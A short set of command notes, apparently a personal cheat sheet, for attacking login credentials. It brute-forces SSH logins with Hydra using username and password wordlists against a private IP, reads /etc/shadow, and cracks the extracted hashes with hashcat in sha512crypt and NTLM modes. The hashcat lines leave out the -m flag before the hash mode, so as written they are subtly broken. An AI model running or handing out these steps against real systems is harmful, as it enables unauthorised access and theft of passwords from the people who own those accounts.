sudo hydra -L username.txt -P wordlist/path.txt 192.168.1.141 ssh  	(You can use telnet,ftp etc)
sudo hydra -l "admin"  -P wordlist/path.txt 192.168.1.141 ssh  

Check the shadow file hash
cat /etc/shadow

#Now crack the shadow password
copy shadow file and new file

man hashcat or hashcat -h 
sudo hashcat -a 0 1800 -o password/store/path.txt shadowhash.txt wordlist/path.txt  (-o is for to save the find password information)
sudo hashcat -a 0 1000 -o password/store/path1.txt shadowhash.txt wordlist/path.txt  (NTLM hash)
